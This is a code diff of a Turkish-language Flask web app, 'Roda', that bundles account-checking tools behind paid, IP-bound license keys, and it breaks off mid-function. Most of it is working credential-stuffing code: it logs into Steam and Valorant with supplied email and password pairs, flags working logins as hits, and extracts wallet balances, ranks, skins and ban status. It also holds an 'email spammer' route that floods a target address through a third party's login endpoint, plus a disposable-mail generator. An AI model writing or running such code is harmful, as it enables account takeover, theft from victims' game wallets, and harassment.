@@ -3,7 +3,6 @@
 """
 Roda - TÜM CHECKER'LAR TEK YERDE
 Admin/Üye ayrımı | 1 Key 1 IP | Loglar | Webhook | Kar Taneleri
-Xbox, Steam, Valorant, Tabii, Wolfteam, Craftrise, Hotmail, Token, TikTok Gen, Site Kopyala, Temp Mail, Email Spammer
 """
 
 import os, json, re, time, random, string, threading, webbrowser, base64, concurrent.futures, urllib3
@@ -45,7 +44,7 @@ def add_log(message, level="INFO"):
     print(f"[{timestamp}] [{level}] {message}")
 
 # ============================================================
-# KEY FONKSİYONLARI (1 KEY 1 IP + TEK KULLANIM)
+# KEY FONKSİYONLARI (1 KEY 1 IP + TEK KULLANIM + ÜYE KODU)
 # ============================================================
 def load_keys():
     if os.path.exists(KEYS_FILE):
@@ -54,6 +53,7 @@ def load_keys():
     return {}
 
 def save_keys(data):
+    os.makedirs(os.path.dirname(KEYS_FILE), exist_ok=True)
     with open(KEYS_FILE, "w", encoding="utf-8") as f:
         json.dump(data, f, indent=2, ensure_ascii=False)
 
@@ -63,13 +63,18 @@ def get_client_ip():
     return request.remote_addr
 
 def is_key_valid(key):
+    # Admin master key her zaman geçerli
     if key == MASTER_KEY:
         return True, "Admin", None
+    
     keys = load_keys()
     if key not in keys:
         return False, None, None
+    
     entry = keys[key]
     client_ip = get_client_ip()
+    
+    # Süre kontrolü
     exp = entry.get("expires")
     if exp:
         if datetime.now() >= datetime.fromisoformat(exp):
@@ -77,14 +82,19 @@ def is_key_valid(key):
             save_keys(keys)
             add_log(f"Key süresi doldu: {key}", "WARNING")
             return False, None, None
+    
+    # IP kontrolü (eğer bağlanmışsa)
     bound_ip = entry.get("bound_ip")
     if bound_ip and bound_ip != client_ip:
         add_log(f"IP eşleşmedi! Key: {key}, Beklenen: {bound_ip}, Gelen: {client_ip}", "WARNING")
         return False, None, None
+    
+    # Tek kullanım kontrolü
     if entry.get("used", False):
         add_log(f"Key zaten kullanılmış: {key}", "WARNING")
         return False, None, None
-    return True, entry.get("note", "Kullanıcı"), entry
+    
+    return True, entry.get("role", "Üye"), entry
 
 def mark_key_used(key):
     keys = load_keys()
@@ -98,36 +108,22 @@ def is_admin(key):
     return valid and role == "Admin"
 
 # ============================================================
-# PLATFORMLAR
+# PLATFORMLAR (TÜM CHECKER'LAR)
 # ============================================================
 PLATFORMS = [
-    {"name": "YouTube", "domain": "youtube.com", "icon": "fa-brands fa-youtube"},
-    {"name": "TikTok Gen", "domain": "tiktok.com", "icon": "fa-brands fa-tiktok"},
-    {"name": "Spotify", "domain": "spotify.com", "icon": "fa-brands fa-spotify"},
-    {"name": "Roblox", "domain": "roblox.com", "icon": "fa-solid fa-gamepad"},
-    {"name": "Netflix", "domain": "netflix.com", "icon": "fa-solid fa-film"},
-    {"name": "CapCut", "domain": "capcut.com", "icon": "fa-solid fa-scissors"},
-    {"name": "Discord", "domain": "discord.com", "icon": "fa-brands fa-discord"},
-    {"name": "Epic Games", "domain": "epicgames.com", "icon": "fa-solid fa-crown"},
-    {"name": "Hesapcomtr", "domain": "hesap.com.tr", "icon": "fa-solid fa-user"},
-    {"name": "Itemsatış", "domain": "itemsatis.com", "icon": "fa-solid fa-cart-shopping"},
-    {"name": "Epinify", "domain": "epinify.com", "icon": "fa-solid fa-ticket"},
-    {"name": "Twitch", "domain": "twitch.tv", "icon": "fa-brands fa-twitch"},
-    {"name": "Steam", "domain": "steampowered.com", "icon": "fa-brands fa-steam"},
-    {"name": "PlayStation", "domain": "playstation.com", "icon": "fa-solid fa-play"},
+    {"name": "Tabii", "domain": "tabii.com", "icon": "fa-solid fa-tv"},
     {"name": "Xbox & MC", "domain": "xbox.com", "icon": "fa-brands fa-xbox"},
-    {"name": "GitHub", "domain": "github.com", "icon": "fa-brands fa-github"},
-    {"name": "Minecraft", "domain": "minecraft.net", "icon": "fa-solid fa-cube"},
     {"name": "Wolfteam", "domain": "joygame.com", "icon": "fa-solid fa-skull"},
     {"name": "Craftrise", "domain": "craftrise.com.tr", "icon": "fa-solid fa-hammer"},
     {"name": "Hotmail", "domain": "outlook.com", "icon": "fa-solid fa-envelope"},
     {"name": "Token Check", "domain": "discord.com", "icon": "fa-solid fa-key"},
-    {"name": "Tabii", "domain": "tabii.com", "icon": "fa-solid fa-tv"},
+    {"name": "TikTok Gen", "domain": "tiktok.com", "icon": "fa-brands fa-tiktok"},
+    {"name": "Steam", "domain": "steampowered.com", "icon": "fa-brands fa-steam"},
     {"name": "Valorant", "domain": "valorant.com", "icon": "fa-solid fa-crosshairs"},
 ]
 
 # ============================================================
-# CHECKER FONKSİYONLARI
+# TÜM CHECKER FONKSİYONLARI
 # ============================================================
 
 # ---- TABII ----
@@ -263,190 +259,6 @@ def get_xbox_profile(session, uhs, xsts_token):
         pass
     return {"gamertag": "N/A", "tier": "N/A"}
 
-# ---- STEAM ----
-def check_steam_account(email, password):
-    try:
-        session = requests.Session()
-        session.headers.update({
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
-            "Accept-Language": "en-US,en;q=0.9",
-        })
-        # RSA Key al
-        rsa_resp = session.get("https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/", params={"account_name": email}, timeout=10).json()
-        rsa_data = rsa_resp["response"]
-        key = RSA.construct((int(rsa_data["publickey_mod"], 16), int(rsa_data["publickey_exp"], 16)))
-        enc_pwd = base64.b64encode(PKCS1_v1_5.new(key).encrypt(password.encode())).decode()
-        
-        # Login
-        login_resp = session.post("https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/",
-            data={"account_name": email, "encrypted_password": enc_pwd, "encryption_timestamp": rsa_data["timestamp"],
-                  "remember_login": "true", "website_id": "Community", "device_friendly_name": "Chrome Browser"}, timeout=10).json().get("response", {})
-        steamid = login_resp.get("steamid")
-        if not steamid:
-            return {"status": "BAD", "message": "Giriş başarısız"}
-        guard_types = [c.get("confirmation_type", 0) for c in login_resp.get("allowed_confirmations", [])]
-        if any(t in (3, 4) for t in guard_types):
-            return {"status": "2FA", "message": "2FA gerekli"}
-        
-        time.sleep(0.5)
-        poll = session.post("https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/",
-            data={"client_id": login_resp["client_id"], "request_id": login_resp["request_id"]}, timeout=10).json().get("response", {})
-        access_token = poll.get("access_token")
-        if not access_token:
-            return {"status": "BAD", "message": "Token alınamadı"}
-        
-        # Profil bilgileri
-        profile_resp = session.get("https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/", params={"access_token": access_token, "steamids": steamid}, timeout=10)
-        profile_data = profile_resp.json().get("response", {}).get("players", [{}])[0] if profile_resp.status_code == 200 else {}
-        
-        # Level
-        level_resp = session.get("https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/", params={"access_token": access_token, "steamid": steamid}, timeout=10)
-        level = level_resp.json().get("response", {}).get("player_level", "?") if level_resp.status_code == 200 else "?"
-        
-        # VAC
-        ban_resp = session.get("https://api.steampowered.com/ISteamUser/GetPlayerBans/v1/", params={"access_token": access_token, "steamids": steamid}, timeout=10)
-        ban_data = ban_resp.json().get("players", [{}])[0] if ban_resp.status_code == 200 else {}
-        vac_banned = ban_data.get("VACBanned", False)
-        vac_count = ban_data.get("NumberOfVACBans", 0)
-        
-        # Bakiye
-        balance = "—"
-        try:
-            bal_resp = session.get("https://store.steampowered.com/api/getWalletBalance/", params={"steamid": steamid}, timeout=8)
-            if bal_resp.status_code == 200:
-                bal_data = bal_resp.json()
-                if bal_data.get("success"):
-                    balance = bal_data.get("formattedBalance", "—")
-        except: pass
-        
-        # Ülke
-        country = profile_data.get("loccountrycode", "—")
-        profile_name = profile_data.get("personaname", "?")
-        
-        details = {
-            "steamid": steamid,
-            "profile_name": profile_name,
-            "level": level,
-            "country": country,
-            "balance": balance,
-            "vac_banned": vac_banned,
-            "vac_count": vac_count,
-            "profile_url": profile_data.get("profileurl", ""),
-        }
-        return {"status": "HIT", "message": f"{profile_name} | Lvl:{level} | Ülke:{country} | Bakiye:{balance} | VAC:{vac_count} ban", "details": details}
-    except Exception as e:
-        return {"status": "ERROR", "message": str(e)[:60]}
-
-# ---- VALORANT ----
-def check_valorant_account(email, password):
-    try:
-        session = requests.Session()
-        session.headers.update({
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
-            "Content-Type": "application/json",
-            "Accept": "application/json"
-        })
-        # Authorize
-        r = session.post("https://auth.riotgames.com/api/v1/authorization", json={
-            "client_id": "riot-client",
-            "nonce": "1",
-            "redirect_uri": "http://localhost/redirect",
-            "response_type": "token id_token",
-            "scope": "openid link ban account email mobile_number"
-        }, timeout=10)
-        if r.status_code != 200:
-            return {"status": "BAD", "message": "Auth başarısız"}
-        
-        # Login
-        r = session.put("https://auth.riotgames.com/api/v1/authorization", json={
-            "type": "auth",
-            "username": email,
-            "password": password,
-            "remember": False
-        }, timeout=10)
-        if r.status_code != 200:
-            return {"status": "BAD", "message": "Sunucu hatası"}
-        data = r.json()
-        if "error" in data:
-            if "multifactor" in str(data):
-                return {"status": "2FA", "message": "2FA gerekli"}
-            return {"status": "BAD", "message": data.get("error", "Giriş reddedildi")}
-        
-        # Token al
-        if "response" in data and "parameters" in data["response"]:
-            uri = data["response"]["parameters"]["uri"]
-            if "access_token=" in uri:
-                token = uri.split("access_token=")[1].split("&")[0]
-                session.headers.update({"Authorization": f"Bearer {token}"})
-            else:
-                return {"status": "BAD", "message": "Token alınamadı"}
-        else:
-            return {"status": "BAD", "message": "Token alınamadı"}
-        
-        # User Info
-        r = session.get("https://auth.riotgames.com/userinfo", timeout=10)
-        if r.status_code == 200:
-            ui = r.json()
-            puuid = ui.get("sub", "")
-            riot_id = ui.get("acct", {}).get("game_name", "") + "#" + ui.get("acct", {}).get("tag_line", "")
-        
-        # Entitlements
-        r = session.post("https://entitlements.auth.riotgames.com/api/token/v1", json={}, timeout=10)
-        if r.status_code == 200:
-            ent = r.json()
-            if ent.get("entitlements_token"):
-                session.headers.update({"X-Riot-Entitlements-JWT": ent["entitlements_token"]})
-        
-        # Bölge
-        region = "eu"
-        try:
-            r = session.get("https://riot-geo.pas.si.riotgames.com/pas/v1/service/valorant", timeout=10)
-            if r.status_code == 200:
-                region = r.json().get("affinity", "eu")
-        except: pass
-        
-        if not puuid:
-            return {"status": "BAD", "message": "PUUID alınamadı"}
-        
-        # Level
-        level = "?"
-        try:
-            r = session.get(f"https://pd.{region}.a.pvp.net/account-xp/v1/players/{puuid}", timeout=10)
-            if r.status_code == 200:
-                level = r.json().get("progress", {}).get("level", "?")
-        except: pass
-        
-        # Wallet
-        vp, rp = "?", "?"
-        try:
-            r = session.get(f"https://pd.{region}.a.pvp.net/store/v1/wallet/{puuid}", timeout=10)
-            if r.status_code == 200:
-                w = r.json()
-                vp = w.get("Balances", {}).get("85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741", "0")
-                rp = w.get("Balances", {}).get("e59aa87c-4cbf-517a-5983-6e81511be9b7", "0")
-        except: pass
-        
-        # Skin count
-        skins = "?"
-        try:
-            r = session.get(f"https://pd.{region}.a.pvp.net/store/v1/entitlements/{puuid}/e7c63390-eda7-46e0-bb7a-a6abdacd2433", timeout=10)
-            if r.status_code == 200:
-                skins = len(r.json().get("Entitlements", []))
-        except: pass
-        
-        details = {
-            "puuid": puuid,
-            "riot_id": riot_id,
-            "region": region,
-            "level": level,
-            "vp": vp,
-            "rp": rp,
-            "skins": skins,
-        }
-        return {"status": "HIT", "message": f"{riot_id} | Lvl:{level} | VP:{vp} | Skin:{skins}", "details": details}
-    except Exception as e:
-        return {"status": "ERROR", "message": str(e)[:60]}
-
 # ---- WOLFTEAM ----
 def check_wolfteam_account(email, password):
     try:
@@ -508,7 +320,7 @@ def check_hotmail_account(email, password):
     except Exception as e:
         return {"status": "ERROR", "message": str(e)[:60]}
 
-# ---- TOKEN ----
+# ---- TOKEN CHECK ----
 def check_token(token_type, token):
     if token_type == "discord":
         headers = {"Authorization": token}
@@ -556,6 +368,210 @@ def check_tiktok_username(username):
             return {"status": "CUSTOM", "message": f"Limit/Ban"}
     except:
         return {"status": "ERROR", "message": "Bağlantı hatası"}
+
+# ---- STEAM ----
+def check_steam_account(email, password):
+    try:
+        session = requests.Session()
+        session.headers.update({
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
+            "Accept-Language": "en-US,en;q=0.9",
+        })
+        # 1. RSA Public Key al
+        r = session.get("https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/", params={"account_name": email}, timeout=8).json()
+        if r.get("response") is None:
+            return {"status": "BAD", "message": "API hatası"}
+        rsa = r["response"]
+        key = RSA.construct((int(rsa["publickey_mod"], 16), int(rsa["publickey_exp"], 16)))
+        enc_pwd = base64.b64encode(PKCS1_v1_5.new(key).encrypt(password.encode())).decode()
+        
+        # 2. BeginAuthSession
+        resp = session.post("https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/",
+            data={"account_name": email, "encrypted_password": enc_pwd, "encryption_timestamp": rsa["timestamp"], "remember_login": "true", "website_id": "Community", "device_friendly_name": "Chrome Browser"}, timeout=8).json().get("response", {})
+        
+        steamid = resp.get("steamid")
+        if not steamid:
+            return {"status": "BAD", "message": "Giriş başarısız"}
+        
+        # 3. Guard kontrolü
+        guard_types = [c.get("confirmation_type", 0) for c in resp.get("allowed_confirmations", [])]
+        if any(t in (3, 4) for t in guard_types):
+            return {"status": "2FA", "message": "Steam Guard gerekli"}
+        
+        # 4. PollAuthSessionStatus
+        time.sleep(0.5)
+        poll = session.post("https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/",
+            data={"client_id": resp["client_id"], "request_id": resp["request_id"]}, timeout=8).json().get("response", {})
+        
+        access = poll.get("access_token")
+        refresh = poll.get("refresh_token")
+        if not access or not refresh:
+            return {"status": "BAD", "message": "Token alınamadı"}
+        
+        # 5. Finalize login
+        session.get("https://store.steampowered.com/", timeout=8)
+        sid = session.cookies.get("sessionid", "")
+        try:
+            fin = session.post("https://login.steampowered.com/jwt/finalizelogin", data={"nonce": refresh, "sessionid": sid, "redir": "https://steamcommunity.com/login/home/?goto="}, timeout=8)
+            for t in fin.json().get("transfer_info", []):
+                if t.get("url"): session.post(t["url"], data=t.get("params", {}), timeout=8)
+        except: pass
+        
+        # 6. Steam level
+        try:
+            r = session.get("https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/", params={"access_token": access, "steamid": steamid}, timeout=8)
+            level = r.json()["response"].get("player_level", "?") if r.status_code == 200 else "?"
+        except:
+            level = "?"
+        
+        # 7. VAC durumu
+        try:
+            r = session.get("https://api.steampowered.com/ISteamUser/GetPlayerBans/v1/", params={"access_token": access, "steamids": steamid}, timeout=8)
+            vac_data = r.json()["players"][0] if r.status_code == 200 and r.json().get("players") else {}
+            vac_banned = bool(vac_data.get("VACBanned", False))
+            vac_count = vac_data.get("NumberOfVACBans", 0)
+            vac_days = vac_data.get("DaysSinceLastBan", 0)
+        except:
+            vac_banned, vac_count, vac_days = False, 0, 0
+        
+        vac_str = f"🔴VAC({vac_count})" if vac_banned else "🟢Temiz"
+        
+        # 8. Cüzdan bakiyesi
+        try:
+            r = session.get("https://store.steampowered.com/account/", timeout=8)
+            m = re.search(r'id="header_wallet_balance"[^>]*>\s*([^<]+)', r.text)
+            balance = m.group(1).strip() if m else "—"
+        except:
+            balance = "—"
+        
+        # 9. Ülke
+        try:
+            r = session.get("https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/", params={"access_token": access, "steamids": steamid}, timeout=8)
+            if r.status_code == 200 and r.json()["response"]["players"]:
+                country = r.json()["response"]["players"][0].get("loccountrycode", "—")
+            else:
+                country = "—"
+        except:
+            country = "—"
+        
+        result_msg = f"Steam | Lvl:{level} | Bakiye:{balance} | VAC:{vac_str} | Ülke:{country}"
+        return {"status": "HIT", "message": result_msg, "details": {"level": level, "balance": balance, "vac": vac_str, "country": country}}
+        
+    except Exception as e:
+        return {"status": "ERROR", "message": str(e)[:60]}
+
+# ---- VALORANT ----
+def check_valorant_account(email, password):
+    session = requests.Session()
+    session.headers.update({
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+        "Accept-Language": "en-US,en;q=0.9",
+    })
+    try:
+        # 1. Authorize
+        r = session.post("https://auth.riotgames.com/api/v1/authorization", json={"client_id": "riot-client", "nonce": "1", "redirect_uri": "http://localhost/redirect", "response_type": "token id_token", "scope": "openid link ban account email mobile_number"}, timeout=10)
+        if r.status_code != 200:
+            return {"status": "BAD", "message": "Auth başarısız"}
+        
+        # 2. Login
+        r = session.put("https://auth.riotgames.com/api/v1/authorization", json={"type": "auth", "username": email, "password": password, "remember": False}, timeout=10)
+        if r.status_code != 200:
+            return {"status": "BAD", "message": "Sunucu hatası"}
+        data = r.json()
+        if "error" in data:
+            if "multifactor" in str(data):
+                return {"status": "2FA", "message": "2FA gerekli"}
+            return {"status": "BAD", "message": data.get("error", "Giriş reddedildi")}
+        
+        # 3. Access Token
+        if "response" in data and "parameters" in data["response"]:
+            uri = data["response"]["parameters"]["uri"]
+            if "access_token=" in uri:
+                token = uri.split("access_token=")[1].split("&")[0]
+                session.headers.update({"Authorization": f"Bearer {token}"})
+            else:
+                return {"status": "BAD", "message": "Token alınamadı"}
+        else:
+            return {"status": "BAD", "message": "Token alınamadı"}
+        
+        # 4. User Info
+        r = session.get("https://auth.riotgames.com/userinfo", timeout=10)
+        if r.status_code == 200:
+            ui = r.json()
+            game_name = ui.get("acct", {}).get("game_name", "?")
+            tag_line = ui.get("acct", {}).get("tag_line", "")
+        
+        # 5. Entitlements Token
+        r = session.post("https://entitlements.auth.riotgames.com/api/token/v1", json={}, timeout=10)
+        if r.status_code == 200:
+            ent = r.json()
+            if ent.get("entitlements_token"):
+                session.headers.update({"X-Riot-Entitlements-JWT": ent["entitlements_token"]})
+        
+        # 6. Bölge
+        region = "eu"
+        try:
+            r = session.get("https://riot-geo.pas.si.riotgames.com/pas/v1/service/valorant", timeout=10)
+            if r.status_code == 200:
+                region = r.json().get("affinity", "eu")
+        except:
+            pass
+        
+        # 7. PUUID
+        puuid = ui.get("sub")
+        if not puuid:
+            return {"status": "BAD", "message": "PUUID alınamadı"}
+        
+        # 8. Level
+        endpoint = f"https://pd.{region}.a.pvp.net"
+        try:
+            r = session.get(f"{endpoint}/account-xp/v1/players/{puuid}", timeout=10)
+            level = r.json().get("progress", {}).get("level", "?") if r.status_code == 200 else "?"
+        except:
+            level = "?"
+        
+        # 9. Wallet
+        try:
+            r = session.get(f"{endpoint}/store/v1/wallet/{puuid}", timeout=10)
+            if r.status_code == 200:
+                w = r.json()
+                vp = w.get("Balances", {}).get("85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741", "0")
+                rp = w.get("Balances", {}).get("e59aa87c-4cbf-517a-5983-6e81511be9b7", "0")
+            else:
+                vp, rp = "?", "?"
+        except:
+            vp, rp = "?", "?"
+        
+        # 10. Rank
+        try:
+            r = session.get(f"{endpoint}/mmr/v1/players/{puuid}", timeout=10)
+            if r.status_code == 200:
+                mmr = r.json()
+                ranked = mmr.get("QueueSkills", {}).get("competitive", {})
+                if ranked:
+                    seasons = ranked.get("SeasonalInfoBySeasonID", {})
+                    if seasons:
+                        first = list(seasons.values())[0]
+                        tier = first.get("CompetitiveTier", "?")
+                        tier_names = {0:"Unranked",1:"Iron 1",2:"Iron 2",3:"Iron 3",4:"Bronze 1",5:"Bronze 2",6:"Bronze 3",
+                                      7:"Silver 1",8:"Silver 2",9:"Silver 3",10:"Gold 1",11:"Gold 2",12:"Gold 3",
+                                      13:"Platinum 1",14:"Platinum 2",15:"Platinum 3",16:"Diamond 1",17:"Diamond 2",18:"Diamond 3",
+                                      19:"Ascendant 1",20:"Ascendant 2",21:"Ascendant 3",22:"Immortal 1",23:"Immortal 2",24:"Immortal 3",25:"Radiant"}
+                        rank = tier_names.get(tier, "?")
+                    else:
+                        rank = "?"
+                else:
+                    rank = "?"
+            else:
+                rank = "?"
+        except:
+            rank = "?"
+        
+        result_msg = f"Valorant | {game_name}#{tag_line} | Lvl:{level} | VP:{vp} | RP:{rp} | Rank:{rank}"
+        return {"status": "HIT", "message": result_msg, "details": {"game_name": game_name, "tag_line": tag_line, "level": level, "vp": vp, "rp": rp, "rank": rank}}
+        
+    except Exception as e:
+        return {"status": "ERROR", "message": str(e)[:60]}
 
 # ============================================================
 # KATEGORİZASYON / EXTRACT / PROXY / SCANNER (KISALTILDI)
@@ -816,62 +832,6 @@ class APIScanner:
             pass
 
 # ============================================================
-# TEMP MAIL
-# ============================================================
-def generate_temp_mail():
-    try:
-        dom_res = requests.get("https://api.mail.tm/domains", timeout=10).json()
-        domain = dom_res['hydra:member'][0]['domain']
-        user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-        password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
-        email = f"{user}@{domain}"
-        create_payload = {"address": email, "password": password}
-        requests.post("https://api.mail.tm/accounts", json=create_payload, timeout=10)
-        token_res = requests.post("https://api.mail.tm/token", json=create_payload, timeout=10).json()
-        token = token_res['token']
-        return {"success": True, "email": email, "password": password, "token": token}
-    except Exception as e:
-        return {"success": False, "error": str(e)}
-
-def get_temp_mail_messages(token):
-    try:
-        headers = {"Authorization": f"Bearer {token}"}
-        res = requests.get("https://api.mail.tm/messages", headers=headers, timeout=10)
-        if res.status_code == 200:
-            return {"success": True, "messages": res.json().get('hydra:member', [])}
-        return {"success": False, "error": f"Sunucu Hatası: {res.status_code}"}
-    except Exception as e:
-        return {"success": False, "error": str(e)}
-
-def read_temp_mail(token, msg_id):
-    try:
-        headers = {"Authorization": f"Bearer {token}"}
-        res = requests.get(f"https://api.mail.tm/messages/{msg_id}", headers=headers, timeout=10)
-        if res.status_code == 200:
-            return {"success": True, "message": res.json()}
-        return {"success": False, "error": f"Mesaj Alınamadı: {res.status_code}"}
-    except Exception as e:
-        return {"success": False, "error": str(e)}
-
-# ---- EMAIL SPAMMER ----
-def send_spam_email(target_email):
-    try:
-        headers = {
-            'authority': 'api.kidzapp.com',
-            'accept': 'application/json',
-            'content-type': 'application/json',
-            'user-agent': generate_user_agent()
-        }
-        data = {'email': target_email, 'sdk': 'web', 'platform': 'desktop'}
-        res = requests.post('https://api.kidzapp.com/api/3.0/customlogin/', headers=headers, json=data, timeout=5)
-        if '"message":"EMAIL SENT"' in res.text:
-            return {"success": True, "message": "Paket iletildi"}
-        else:
-            return {"success": False, "message": "Sunucu isteği reddetti"}
-    except Exception as e:
-        return {"success": False, "message": str(e)[:60]}
-
-# ============================================================
 # FLASK ROTALARI
 # ============================================================
 @app.route("/")
@@ -923,26 +883,6 @@ def xbox_check():
     if not email or not password:
         return jsonify({"error": "Eksik"}), 400
     result = check_xbox_account(email, password)
-    return jsonify(result)
-
-@app.route("/api/steam_check", methods=["POST"])
-def steam_check():
-    data = request.json
-    email = data.get("email", "").strip()
-    password = data.get("password", "").strip()
-    if not email or not password:
-        return jsonify({"error": "Eksik"}), 400
-    result = check_steam_account(email, password)
-    return jsonify(result)
-
-@app.route("/api/valorant_check", methods=["POST"])
-def valorant_check():
-    data = request.json
-    email = data.get("email", "").strip()
-    password = data.get("password", "").strip()
-    if not email or not password:
-        return jsonify({"error": "Eksik"}), 400
-    result = check_valorant_account(email, password)
     return jsonify(result)
 
 @app.route("/api/wolfteam_check", methods=["POST"])
@@ -1001,51 +941,24 @@ def tiktok_gen_random():
     result = check_tiktok_username(username)
     return jsonify({"username": username, "result": result})
 
-# ---- TEMP MAIL ROUTE'LARI ----
-@app.route("/api/temp_mail_generate", methods=["POST"])
-def temp_mail_generate():
-    key = request.args.get("key")
-    if not is_admin(key):
-        return jsonify({"error": "Yetkisiz"}), 401
-    result = generate_temp_mail()
-    return jsonify(result)
-
-@app.route("/api/temp_mail_refresh", methods=["POST"])
-def temp_mail_refresh():
-    key = request.args.get("key")
-    if not is_admin(key):
-        return jsonify({"error": "Yetkisiz"}), 401
-    data = request.json
-    token = data.get("token", "")
-    if not token:
-        return jsonify({"error": "Token gerekli"}), 400
-    result = get_temp_mail_messages(token)
-    return jsonify(result)
-
-@app.route("/api/temp_mail_read", methods=["POST"])
-def temp_mail_read():
-    key = request.args.get("key")
-    if not is_admin(key):
-        return jsonify({"error": "Yetkisiz"}), 401
-    data = request.json
-    token = data.get("token", "")
-    msg_id = data.get("msg_id", "")
-    if not token or not msg_id:
-        return jsonify({"error": "Token ve msg_id gerekli"}), 400
-    result = read_temp_mail(token, msg_id)
-    return jsonify(result)
-
-# ---- EMAIL SPAMMER ROUTE ----
-@app.route("/api/spam_send", methods=["POST"])
-def spam_send():
-    key = request.args.get("key")
-    if not is_admin(key):
-        return jsonify({"error": "Yetkisiz"}), 401
+@app.route("/api/steam_check", methods=["POST"])
+def steam_check():
     data = request.json
     email = data.get("email", "").strip()
-    if not email:
-        return jsonify({"error": "Email gerekli"}), 400
-    result = send_spam_email(email)
+    password = data.get("password", "").strip()
+    if not email or not password:
+        return jsonify({"error": "Eksik"}), 400
+    result = check_steam_account(email, password)
+    return jsonify(result)
+
+@app.route("/api/valorant_check", methods=["POST"])
+def valorant_check():
+    data = request.json
+    email = data.get("email", "").strip()
+    password = data.get("password", "").strip()
+    if not email or not password:
+        return jsonify({"error": "Eksik"}), 400
+    result = check_valorant_account(email, password)
     return jsonify(result)
 
 @app.route("/api/scan", methods=["GET"])
@@ -1082,13 +995,14 @@ def admin_generate():
     if not is_admin(key):
         return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
     note = data.get("note", "Oluşturuldu")
+    role = data.get("role", "Üye")
     hours = int(data.get("hours", 24))
     expires = datetime.now() + timedelta(hours=hours)
     new_key = "RODA-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
     keys = load_keys()
-    keys[new_key] = {"note": note, "expires": expires.isoformat(), "created": datetime.now().isoformat(), "used": False, "bound_ip": None}
+    keys[new_key] = {"note": note, "role": role, "expires": expires.isoformat(), "created": datetime.now().isoformat(), "used": False, "bound_ip": None}
     save_keys(keys)
-    add_log(f"Yeni key oluşturuldu: {new_key} - {note} ({hours} saat)", "SUCCESS")
+    add_log(f"Yeni key oluşturuldu: {new_key} - {note} ({role}) ({hours} saat)", "SUCCESS")
     return jsonify({"success": True, "key": new_key, "expires": expires.strftime("%Y-%m-%d %H:%M:%S")})
 
 @app.route("/api/admin/delete", methods=["POST"])
@@ -1192,7 +1106,94 @@ def sitecopy():
         return jsonify({"error": str(e)}), 500
 
 # ============================================================
-# HTML (MAVİ TEMA + KAR TANELERİ + TÜM ÖZELLİKLER)
+# TEMP MAIL (ADMIN)
+# ============================================================
+@app.route("/api/temp_mail_generate", methods=["POST"])
+def temp_mail_generate():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    try:
+        dom_res = requests.get("https://api.mail.tm/domains", timeout=10).json()
+        domain = dom_res['hydra:member'][0]['domain']
+        user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+        password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
+        email = f"{user}@{domain}"
+        create_payload = {"address": email, "password": password}
+        requests.post("https://api.mail.tm/accounts", json=create_payload, timeout=10)
+        token_res = requests.post("https://api.mail.tm/token", json=create_payload, timeout=10).json()
+        token = token_res['token']
+        return jsonify({"success": True, "email": email, "password": password, "token": token})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)})
+
+@app.route("/api/temp_mail_refresh", methods=["POST"])
+def temp_mail_refresh():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    data = request.json
+    token = data.get("token", "")
+    if not token:
+        return jsonify({"error": "Token gerekli"}), 400
+    try:
+        headers = {"Authorization": f"Bearer {token}"}
+        res = requests.get("https://api.mail.tm/messages", headers=headers, timeout=10)
+        if res.status_code == 200:
+            return jsonify({"success": True, "messages": res.json().get('hydra:member', [])})
+        return jsonify({"success": False, "error": f"Sunucu Hatası: {res.status_code}"})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)})
+
+@app.route("/api/temp_mail_read", methods=["POST"])
+def temp_mail_read():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    data = request.json
+    token = data.get("token", "")
+    msg_id = data.get("msg_id", "")
+    if not token or not msg_id:
+        return jsonify({"error": "Token ve msg_id gerekli"}), 400
+    try:
+        headers = {"Authorization": f"Bearer {token}"}
+        res = requests.get(f"https://api.mail.tm/messages/{msg_id}", headers=headers, timeout=10)
+        if res.status_code == 200:
+            return jsonify({"success": True, "message": res.json()})
+        return jsonify({"success": False, "error": f"Mesaj Alınamadı: {res.status_code}"})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)})
+
+# ============================================================
+# EMAIL SPAMMER (ADMIN)
+# ============================================================
+@app.route("/api/spam_send", methods=["POST"])
+def spam_send():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    data = request.json
+    email = data.get("email", "").strip()
+    if not email:
+        return jsonify({"error": "Email gerekli"}), 400
+    try:
+        headers = {
+            'authority': 'api.kidzapp.com',
+            'accept': 'application/json',
+            'content-type': 'application/json',
+            'user-agent': generate_user_agent()
+        }
+        data = {'email': email, 'sdk': 'web', 'platform': 'desktop'}
